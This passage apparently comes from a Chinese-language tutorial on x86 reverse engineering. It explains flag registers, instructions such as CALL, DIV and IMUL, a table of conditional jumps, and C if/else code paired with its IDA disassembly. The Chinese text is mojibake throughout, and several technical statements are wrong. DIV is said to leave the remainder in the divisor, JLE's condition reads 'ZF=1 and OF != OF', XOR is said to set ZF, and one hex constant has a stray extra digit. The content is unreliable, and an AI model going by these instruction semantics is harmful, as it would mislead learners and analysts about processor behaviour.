ä¸ºè¯¥æŒ‡ä»¤åœ¨åšæ¯”è¾ƒæ“ä½œ(ç­‰äºã€ä¸ç­‰äº)ï¼Œé‚£ä»€ä¹ˆæ—¶å€™ç»“æœæ˜¯0ä»€ä¹ˆæ—¶å€™æ˜¯1å‘¢ï¼Ÿå¾…ä¼šå†è¯´) </p><p><strong>The O-Flag(æº¢å‡ºæ ‡å¿—)ï¼š</strong></p><p>OFå¯„å­˜å™¨åœ¨é€†å‘å·¥ç¨‹ä¸­å¤§æ¦‚å äº†4%ï¼Œå½“ä¸Šä¸€æ­¥æ“ä½œæ”¹å˜äº†æŸå¯„å­˜å™¨çš„æœ€é«˜æœ‰æ•ˆä½æ—¶ï¼ŒOFå¯„å­˜å™¨ä¼šè¢«è®¾ç½®æˆ1ã€‚ä¾‹å¦‚ï¼šEAXçš„å€¼ä¸º7FFFFFFFFï¼Œå¦‚æœä½ æ­¤æ—¶å†ç»™EAXåŠ 1ï¼ŒOFå¯„å­˜å™¨å°±ä¼šè¢«è®¾ç½®æˆ1ï¼Œå› ä¸ºæ­¤æ—¶EAXå¯„å­˜å™¨çš„æœ€é«˜æœ‰æ•ˆä½æ”¹å˜äº†(ä½ å¯ä»¥ä½¿ç”¨ç”µè„‘è‡ªå¸¦è®¡ç®—å™¨å°†è¿™ä¸ª16è¿›åˆ¶è½¬åŒ–æˆ2è¿›åˆ¶çœ‹çœ‹)ã€‚è¿˜æœ‰å½“ä¸Šä¸€æ­¥æ“ä½œäº§ç”Ÿæº¢å‡ºæ—¶(å³ç®—æœ¯è¿ç®—è¶…å‡ºäº†æœ‰ç¬¦å·æ•°çš„è¡¨ç¤ºèŒƒå›´)ï¼ŒOFå¯„å­˜å™¨ä¹Ÿä¼šè¢«è®¾ç½®æˆ1ã€‚ </p><p><strong>The C-Flag(è¿›ä½æ ‡å¿—)ï¼š</strong></p><p>è¿›ä½å¯„å­˜å™¨çš„ä½¿ç”¨å¤§æ¦‚å äº†1%ï¼Œå¦‚æœäº§ç”Ÿäº†æº¢å‡ºï¼Œå°±ä¼šè¢«è®¾ç½®æˆ1ã€‚ä¾‹ï¼Œå‡å¦‚æŸå¯„å­˜å™¨å€¼ä¸ºFFFFFFFFï¼Œå†åŠ ä¸Š1å°±ä¼šäº§ç”Ÿæº¢å‡ºï¼Œä½ å¯ä»¥ç”¨ç”µè„‘è‡ªå¸¦çš„è®¡ç®—å™¨å°è¯•ã€‚ </p><h4 id="æŒ‡ä»¤"><a href="#æŒ‡ä»¤" class="headerlink" title="æŒ‡ä»¤"></a>æŒ‡ä»¤</h4><p><strong>CALL (è°ƒç”¨)</strong></p><p>è¯­æ³•ï¼šCALL something</p><p>CALLæŒ‡ä»¤å°†å½“å‰çš„ç›¸å¯¹åœ°å€(IP)å‹å…¥æ ˆä¸­ï¼Œå¹¶ä¸”è°ƒç”¨CALL åçš„å­ç¨‹åº</p><p>CALL å¯ä»¥è¿™æ ·ä½¿ç”¨ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><pre><code class="hljs html">CALL 404000                ;; æœ€å¸¸è§: CALL åœ°å€CALL EAX                   ;<br>; CALL å¯„å­˜å™¨ - å¦‚æœå¯„å­˜å™¨å­˜çš„å€¼ä¸º404000ï¼Œé‚£å°±ç­‰åŒäºç¬¬ä¸€ç§æƒ…å†µCALL DWORD PTR [EAX]       ;; <br>CALL [EAX]åç§»é‡æ‰€æŒ‡å‘çš„åœ°å€CALL DWORD PTR [EAX+5]     ;;â€˜â€™<br>CALL [EAX+5]åç§»é‡æ‰€æŒ‡å‘çš„åœ°å€<br></code></pre></td></tr></table></figure><p><strong>CDQ</strong></p><p>è¯­æ³•ï¼šCDQ</p><p>CDQæŒ‡ä»¤ç¬¬ä¸€æ¬¡å‡ºç°æ—¶é€šå¸¸ä¸å¥½ç†è§£ã€‚å®ƒé€šå¸¸å‡ºç°åœ¨é™¤æ³•å‰é¢ï¼Œä½œç”¨æ˜¯å°†EDXçš„æ‰€æœ‰ä½å˜æˆEAXæœ€é«˜ä½çš„å€¼ï¼Œ</p><p>æ¯”å¦‚å½“EAX&gt;=80000000hæ—¶ï¼Œå…¶äºŒè¿›åˆ¶æœ€é«˜ä½ä¸º1ï¼Œåˆ™EDXè¢«32ä½å…¨èµ‹å€¼ä¸º1ï¼Œå³FFFFFFFF</p><p>è‹¥EAX&lt;80000000ï¼Œåˆ™å…¶äºŒè¿›åˆ¶æœ€é«˜ä½ä¸º0ï¼ŒEDXä¸º00000000ã€‚</p><p>ç„¶åå°†EDXï¼šEAXç»„æˆæ–°æ•°(64ä½)ï¼šFFFFFFFF 80000000</p><p><strong>DEC (è‡ªå‡)</strong></p><p>è¯­æ³•: DEC something</p><p>decç”¨æ¥è‡ªå‡1ï¼Œç›¸å½“äºcä¸­çš„â€“</p><p>decå¯ä»¥æœ‰ä»¥ä¸‹ä½¿ç”¨æ–¹å¼ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">dec eax                             ;; eaxè‡ªå‡1dec [eax]                           ;; åç§»é‡ä¸ºeaxçš„å€¼è‡ªå‡1dec [401000]                        ;; åç§»é‡ä¸º401000çš„å€¼è‡ªå‡1dec [eax+401000]                    ;; åç§»é‡ä¸ºeax+401000çš„å€¼è‡ªå‡1<br></code></pre></td></tr></table></figure><p>decæŒ‡ä»¤å¯ä»¥æ ‡è®°ZFã€OF</p><p><strong>DIV (é™¤)</strong></p><p>è¯­æ³•: DIV é™¤æ•°</p><p>DIVæŒ‡ä»¤ç”¨æ¥å°†EAXé™¤ä»¥é™¤æ•°(æ— ç¬¦å·é™¤æ³•)ï¼Œè¢«é™¤æ•°é€šå¸¸æ˜¯EAXï¼Œç»“æœä¹Ÿå‚¨å­˜åœ¨EAXä¸­ï¼Œè€Œè¢«é™¤æ•°å¯¹é™¤æ•°å–çš„æ¨¡å­˜åœ¨é™¤æ•°ä¸­ã€‚</p><p>ä¾‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html">mov eax,64                      ;<br>; EAX = 64h = 100<br>mov ecx,9                       ;; <br>ECX = 9<br>div ecx                         ;; EAXé™¤ä»¥ECX<br></code></pre></td></tr></table></figure><p>åœ¨é™¤æ³•ä¹‹å EAX = 100/9 = 0B(åè¿›åˆ¶ï¼š11) å¹¶ä¸” ECX = 100 MOD 9 = 1</p><p>divæŒ‡ä»¤å¯ä»¥æ ‡è®°CFã€OFã€ZF</p><p><strong>IDIV (æ•´é™¤)</strong></p><p>è¯­æ³•: IDIV é™¤æ•°</p><p>IDIVæ‰§è¡Œæ–¹å¼åŒdivä¸€æ ·ï¼Œä¸è¿‡IDIVæ˜¯æœ‰ç¬¦å·çš„é™¤æ³•</p><p>idivæŒ‡ä»¤å¯ä»¥æ ‡è®°CFã€OCã€ZF</p><p><strong>IMUL (æ•´ä¹˜)</strong></p><p>è¯­æ³•ï¼šIMUL æ•°å€¼</p><p>IMUL ç›®æ ‡å¯„å­˜å™¨ã€æ•°å€¼ã€æ•°å€¼</p><p>IMUL ç›®æ ‡å¯„å­˜å™¨ã€æ•°å€¼</p><p>IMULæŒ‡ä»¤å¯ä»¥æŠŠè®©EAXä¹˜ä¸Šä¸€ä¸ªæ•°(INUL æ•°å€¼)æˆ–è€…è®©ä¸¤ä¸ªæ•°å€¼ç›¸ä¹˜å¹¶æŠŠä¹˜ç§¯æ”¾åœ¨ç›®æ ‡å¯„å­˜å™¨ä¸­(IMUL ç›®æ ‡å¯„å­˜å™¨, æ•°å€¼,æ•°å€¼)æˆ–è€…å°†ç›®æ ‡å¯„å­˜å™¨ä¹˜ä¸ŠæŸæ•°å€¼(IMUL ç›®æ ‡å¯„å­˜å™¨, æ•°å€¼)</p><p>å¦‚æœä¹˜ç§¯å¤ªå¤§ç›®æ ‡å¯„å­˜å™¨è£…ä¸ä¸‹ï¼Œé‚£OFã€CFéƒ½ä¼šè¢«æ ‡è®°ï¼ŒZFä¹Ÿä¼šè¢«æ ‡è®°</p><p><strong>JUMPS</strong></p><p>è¿™äº›éƒ½æ˜¯æœ€é‡è¦çš„è·³è½¬æŒ‡ä»¤å’Œè§¦å‘æ¡ä»¶(é‡è¦ç”¨*æ ‡è®°ï¼Œæœ€é‡è¦ç”¨**æ ‡è®°)ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html">æŒ‡ä»¤                æ¡ä»¶                    æ¡ä»¶<br>JA*          -    å¦‚æœå¤§äºå°±è·³è½¬(æ— ç¬¦å·)      - CF=0 and ZF=0<br>JAE          -    å¦‚æœå¤§äºæˆ–ç­‰äºå°±è·³è½¬(æ— ç¬¦å·)- CF=0JB*          -    å¦‚æœå°äºå°±è·³è½¬(æ— ç¬¦å·)   - CF=<br>1JBE          -    å¦‚æœå°äºæˆ–ç­‰äºå°±è·³è½¬(æ— ç¬¦å·)- CF=1 or ZF=1<br>JC           -    å¦‚æœCFè¢«æ ‡è®°å°±äº†è·³è½¬       - CF=1JCXZ         -    å¦‚æœCXç­‰äº0å°±è·³è½¬      - CX=0<br>JE**         -    å¦‚æœç›¸ç­‰å°±è·³è½¬        - ZF=1<br>JECXZ        -    å¦‚æœECXç­‰äº0å°±è·³è½¬       - ECX=0JG*          -    å¦‚æœå¤§äºå°±è·³è½¬(æœ‰ç¬¦å·)   - ZF=0 and SF=OF (SF = Sign Flag)<br><br>JL          -    å¦‚æœå°äºå°±è·³è½¬(æœ‰ç¬¦å·)    - SF != OF (!= is not)<br>JLE         -    å¦‚æœå°äºæˆ–ç­‰äºå°±è·³è½¬(æœ‰ç¬¦å· - ZF=1 and OF != OF<br>JMP      -    è·³è½¬             - å¼ºåˆ¶è·³è½¬JNA          -    å¦‚æœä¸å¤§äºå°±è·³è½¬(æ— ç¬¦å·)   - CF=1 or ZF=1<br>JNAE         -    å¦‚æœä¸å¤§äºç­‰äºå°±è·³è½¬(æ— ç¬¦å·) - CF=1<br>JNB          -    å¦‚æœä¸å°äºå°±è·³è½¬(æ— ç¬¦å·)   - CF=0JNBE         -    å¦‚æœä¸å°äºç­‰äºå°±è·³è½¬(æ— ç¬¦å·) - CF=0 and ZF=0JNC          -    å¦‚æœCFæœªè¢«æ ‡è®°å°±è·³è½¬     - CF=0JNE**        -    å¦‚æœä¸ç­‰äºå°±è·³è½¬       - ZF=0JNG          -    å¦‚æœä¸å¤§äºå°±è·³è½¬(æœ‰ç¬¦å·)   - ZF=1 or SF!=OF<br>JGE*         -    å¦‚æœå¤§äºæˆ–ç­‰äºå°±è·³è½¬(æœ‰ç¬¦å·) - SF=OF<br>JNGE         -    å¦‚æœä¸å¤§äºç­‰äºå°±è·³è½¬(æœ‰ç¬¦å·) - SF!=OF<br>JNL          -    å¦‚æœä¸å°äºå°±è·³è½¬(æœ‰ç¬¦å·)   - SF=OF<br>JNLE         -    å¦‚æœä¸å°äºç­‰äºå°±è·³è½¬(æœ‰ç¬¦å·) - ZF=0 and SF=OF<br>JNO          -    å¦‚æœOFæœªè¢«æ ‡è®°å°±è·³è½¬     - OF=0<br>JNP          -    å¦‚æœPFæœªè¢«æ ‡è®°å°±è·³è½¬     - PF=0<br>JNS          -    å¦‚æœSFæœªè¢«æ ‡è®°å°±è·³è½¬      - SF=0<br>JNZ          -    å¦‚æœä¸ç­‰äº0å°±è·³è½¬      - ZF=0JO           -    å¦‚æœOFè¢«æ ‡è®°å°±è·³è½¬     - OF=1JP           -    å¦‚æœPFè¢«æ ‡è®°å°±è·³è½¬     - PF=1<br>JPE          -    å¦‚æœæ˜¯å¶æ•°å°±è·³è½¬       - PF=1JPO          -    å¦‚æœæ˜¯å¥‡æ•°å°±è·³è½¬       - PF=0<br>JS           -    å¦‚æœSFè¢«æ ‡è®°å°±è·³è½¬     - SF=1<br>JZ           -    å¦‚æœç­‰äº0å°±è·³è½¬      - ZF=1<br></code></pre></td></tr></table></figure><p><strong>MUL (ä¹˜æ³•)</strong></p><p>è¯­æ³•ï¼šMUL æ•°å€¼</p><p>è¿™ä¸ªæŒ‡ä»¤åŒIMULä¸€æ ·ï¼Œä¸è¿‡MULå¯ä»¥ä¹˜æ— ç¬¦å·æ•°ã€‚</p><p><strong>REP/REPE/REPZ/REPNE/REPNZ</strong></p><p>è¯­æ³•: REP/REPE/REPZ/REPNE/REPNZ ins</p><p>é‡å¤ä¸Šé¢çš„æŒ‡ä»¤ï¼šç›´åˆ°CX=0ã€‚inså¿…é¡»æ˜¯ä¸€ä¸ªæ“ä½œç¬¦ï¼Œæ¯”å¦‚CMPSã€INSã€LODSã€MOVSã€OUTSã€SCAS æˆ– STOS</p><p><strong>RET (è¿”å›)</strong></p><p>è¯­æ³•ï¼šRET</p><p>RET digit</p><p>RETæŒ‡ä»¤çš„åŠŸèƒ½æ˜¯ä»ä¸€ä¸ªä»£ç åŒºåŸŸä¸­é€€å‡ºåˆ°è°ƒç”¨CALLçš„æŒ‡ä»¤å¤„ã€‚</p><p>RET digitåœ¨è¿”å›å‰ä¼šæ¸…ç†æ ˆ</p><p><strong>TEST</strong></p><p>è¯­æ³•ï¼šTEST æ“ä½œç¬¦ã€æ“ä½œç¬¦</p><p>è¿™ä¸ªæŒ‡ä»¤99%éƒ½æ˜¯ç”¨äºâ€TEST EAX, EAXâ€ï¼Œå®ƒæ‰§è¡Œä¸ANDç›¸åŒçš„åŠŸèƒ½ï¼Œä½†æ˜¯å¹¶ä¸å‚¨å­˜æ•°æ®ã€‚å¦‚æœEAX=0å°±ä¼šæ ‡è®°ZFï¼Œå¦‚æœEAXä¸æ˜¯0ï¼Œå°±ä¼šæ¸…ç©ºZF</p><p><strong>XOR</strong></p><p>è¯­æ³•ï¼šXOR ç›®çš„æ•°,æºæ•°</p><p>XORæŒ‡ä»¤å¯¹ä¸¤ä¸ªæ•°è¿›è¡Œå¼‚æˆ–æ“ä½œ</p><p>è¿™ä¸ªæŒ‡ä»¤æ¸…ç©ºOFã€CFï¼Œä½†ä¼šæ ‡è®°ZF</p><p>ä¸ºäº†æ›´å¥½çš„ç†è§£ï¼Œæ€è€ƒä¸‹é¢çš„äºŒè¿›åˆ¶ä¸²ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">1001010110 0101001101<br></code></pre></td></tr></table></figure><p>å¦‚æœå¼‚æˆ–å®ƒä»¬ï¼Œç»“æœå°†æ˜¯1100011011</p><p>å¦‚æœä¸¤ä¸ªå€¼ç›¸ç­‰ï¼Œåˆ™ç»“æœä¸º0ï¼Œå¦åˆ™ä¸º1ï¼Œä½ å¯ä»¥ä½¿ç”¨è®¡ç®—å™¨éªŒç®—ã€‚</p><p>å¾ˆå¤šæƒ…å†µä¸‹æˆ‘ä»¬ä¼šä½¿ç”¨â€XOR EAX, EAXâ€ï¼Œè¿™ä¸ªæ“ä½œæ˜¯å°†EAXèµ‹å€¼ä¸º0ï¼Œå› ä¸ºå½“ä¸€ä¸ªå€¼å¼‚æˆ–å…¶è‡ªèº«ï¼Œå°±è¿‡éƒ½æ˜¯0ã€‚</p><h2 id="é€‰æ‹©ç»“æ„è¯­å¥"><a href="#é€‰æ‹©ç»“æ„è¯­å¥" class="headerlink" title="é€‰æ‹©ç»“æ„è¯­å¥"></a>é€‰æ‹©ç»“æ„è¯­å¥</h2><h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><h4 id="Only-ifelse"><a href="#Only-ifelse" class="headerlink" title="Only ifelse"></a>Only ifelse</h4><p>ç‰¹ç‚¹ï¼š</p><p>â€‹    cmp ;æ¡ä»¶åå†™ï¼Œä¸ºäº†è·³è¿‡åé¢çš„jxx è¿›è€Œæ‰§è¡Œä»£ç å—å†…å®¹</p><p>â€‹    if elseåˆ™éƒ½æ˜¯å¾€å¢é‡åœ°å€è·³è½¬</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> nNumber = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%ud&quot;</span>,&amp;nNumber);<br>    <span class="hljs-keyword">if</span>(argc == <span class="hljs-number">0</span>)<br>    &#123;<br>        nNumber = <span class="hljs-number">0</span>;                <span class="hljs-comment">//ç¬¬ä¸€ç§æƒ…å†µä¸‹æ— åˆ†æ”¯</span><br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        nNumber = <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> nNumber;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹åº”åæ±‡ç¼–ç»“æœ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c">; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">main proc near</span><br><span class="hljs-function"></span><br><span class="hljs-function">var_4</span>= dword ptr <span class="hljs-number">-4</span><br>arg_0= dword ptr  <span class="hljs-number">10</span>h<br>arg_8= qword ptr  <span class="hljs-number">18</span>h<br><br>push    rbp<br>mov     rbp, rsp  <span class="hljs-comment">//åˆå§‹åŒ–æ ˆ</span><br>sub     rsp, <span class="hljs-number">30</span>h   <span class="hljs-comment">//å¼€è¾Ÿæ ˆ</span><br>mov     [rbp+arg_0], ecx <br>mov     [rbp+arg_8], rdx<br>call    __main<br>mov     [rbp+var_4], <span class="hljs-number">0</span>   <span class="hljs-comment">//[rbp-4] =0 val1=0</span><br>lea     rax, [rbp+var_4]  <br>mov     rdx, rax<br>lea     rcx, Format     ; <span class="hljs-string">&quot;%ud&quot;</span><br>call    <span class="hljs-built_in">scanf</span>  <span class="hljs-comment">//scanfè¯»å…¥æ•°æ®</span><br>cmp     [rbp+arg_0], <span class="hljs-number">0</span>   <span class="hljs-comment">// argc==0</span><br>jnz     <span class="hljs-keyword">short</span> loc_40158D<br>       <span class="hljs-comment">//åˆ†æ”¯1</span><br>        mov     [rbp+var_4], <span class="hljs-number">0</span>  <br>jmp     <span class="hljs-keyword">short</span> loc_401594<br>       <span class="hljs-comment">//åˆ†æ”¯2</span><br>        loc_40158D:<br>mov     [rbp+var_4], <span class="hljs-number">0F</span>FFFFFFFh <span class="hljs-comment">// ä»£ç ä¸­ä½“ç°çš„æ˜¯å˜é‡å€¼=-1 è¿™é‡Œä¸ºä»€ä¹ˆæ˜¯0FFFFFFFF</span><br>     <br></code></pre></td></tr></table></figure><h4 id="onlyifelse1"><a href="#onlyifelse1" class="headerlink" title="onlyifelse1"></a>onlyifelse1</h4><p>ç‰¹ç‚¹ï¼š</p><p>â€‹    ä¸èƒ½è°ƒæ¢ifå’Œelseçš„ä½ç½®ï¼Œå› ä¸ºä»£ç çš„ä½ç½®ä¸èƒ½å˜ï¼Œå¦åˆ™æŸäº›ä¾èµ–ä»£ç ä½ç½®çš„è®¡ç®—ä¼šå‡ºé”™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> nNumber = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%ud&quot;</span>,&amp;nNumber);<br>    <span class="hljs-keyword">if</span>(argc == nNumber)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,nNumber / <span class="hljs-number">8</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,nNumber / <span class="hljs-number">5</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> nNumber;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹åº”åæ±‡ç¼–ç»“æœ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c">; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>â†‘p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>Câ†“o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_4           = dword ptr <span class="hljs-number">-4</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h  <span class="hljs-comment">//å¯¹åº”argc</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h    <span class="hljs-comment">//argv</span><br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main     <span class="hljs-comment">//mainå‡½æ•°å¼€å§‹</span><br>.text:<span class="hljs-number">0000000000401564</span>                 mov     [rbp+var_4], <span class="hljs-number">0</span>  ; var_a=<span class="hljs-number">0</span><br>.text:<span class="hljs-number">000000000040156B</span>                 lea     rax, [rbp+var_4]    <br>.text:<span class="hljs-number">000000000040156F</span>                 mov     rdx, rax        ; rdx=<span class="hljs-number">0</span><br>.text:<span class="hljs-number">0000000000401572</span>                 lea     rcx, Format     ; <span class="hljs-string">&quot;%ud&quot;</span><br>.text:<span class="hljs-number">0000000000401579</span>                 call    <span class="hljs-built_in">scanf</span><br>.text:<span class="hljs-number">000000000040157</span>E                 mov     edx, [rbp+arg_0]  <span class="hljs-comment">//argc</span><br>.text:<span class="hljs-number">0000000000401581</span>                 mov     eax, [rbp+var_4] <span class="hljs-comment">//var_a=0</span><br>.text:<span class="hljs-number">0000000000401584</span>                 cmp     edx, eax  <span class="hljs-comment">//if(argc==var_a)&#123; var_a=var_a/8;printf(&quot;%d&quot;,); &#125;</span><br>.text:<span class="hljs-number">0000000000401586</span>                 jnz     <span class="hljs-keyword">short</span> loc_40159E<br>.text:<span class="hljs-number">0000000000401588</span>                 mov     eax, [rbp+var_4]  <span class="hljs-comment">//eax=0</span><br>.text:<span class="hljs-number">000000000040158B</span>                 shr     eax, <span class="hljs-number">3</span>          ; /<span class="hljs-number">8</span><br>.text:<span class="hljs-number">000000000040158</span>E                 mov     edx, eax  <br>.text:<span class="hljs-number">0000000000401590</span>                 lea     rcx, aD         ; <span class="hljs-string">&quot;%d&quot;</span><br>.text:<span class="hljs-number">0000000000401597</span>                 call    <span class="hljs-built_in">printf</span>   <br>.text:<span class="hljs-number">000000000040159</span>C                 jmp     <span class="hljs-keyword">short</span> loc_4015BB<br>.text:<span class="hljs-number">000000000040159</span>E ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">000000000040159</span>E<br>.text:<span class="hljs-number">000000000040159</span>E loc_40159E:                             ; CODE XREF: main+<span class="hljs-number">36</span>â†‘j  <span class="hljs-comment">//else </span><br>.text:<span class="hljs-number">000000000040159</span>E                 mov     eax, [rbp+var_4]  <span class="hljs-comment">//eax=var_a</span><br>.text:<span class="hljs-number">00000000004015</span>A1                 mov     edx, <span class="hljs-number">0</span>CCCCCCCDh<br>.text:<span class="hljs-number">00000000004015</span>A6                 mul     edx   <span class="hljs-comment">//eax * 0CCCCCCCDh</span><br>.text:<span class="hljs-number">00000000004015</span>A8                 mov     eax, edx  <span class="hljs-comment">//</span><br>.text:<span class="hljs-number">00000000004015</span>AA                 shr     eax, <span class="hljs-number">2</span>   <span class="hljs-comment">//eax/4</span><br>.text:<span class="hljs-number">00000000004015</span>AD                 mov     edx, eax<br>.text:<span class="hljs-number">00000000004015</span>AF                 lea     rcx, aD         ; <span class="hljs-string">&quot;%d&quot;</span><br>.text:<span class="hljs-number">00000000004015B</span>6                 call    <span class="hljs-built_in">printf</span><br>.text:<span class="hljs-number">00000000004015B</span>B<br>.text:<span class="hljs-number">00000000004015B</span>B loc_4015BB:                             ; CODE XREF: main+<span class="hljs-number">4</span>Câ†‘j<br>.text:<span class="hljs-number">00000000004015B</span>B                 mov     eax, [rbp+var_4]<br>.text:<span class="hljs-number">00000000004015B</span>E                 add     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">00000000004015</span>C2                 pop     rbp<br>.text:<span class="hljs-number">00000000004015</span>C3                 retn<br>.text:<span class="hljs-number">00000000004015</span>C3 main            endp<br></code></pre></td></tr></table></figure><h4 id="ifelseifelseç»“æ„"><a href="#ifelseifelseç»“æ„" class="headerlink" title="ifelseifelseç»“æ„"></a>ifelseifelseç»“æ„</h4><p>å½“æ¯ä¸ªè·³è½¬æŒ‡ä»¤çš„è·³è½¬åœ°å€ä¹‹å‰éƒ½ç´§è·Ÿç€ jmpæŒ‡ä»¤ï¼Œå¹¶ä¸”ä»–ä»¬çš„è·³è½¬åœ°å€éƒ½ä¸€æ 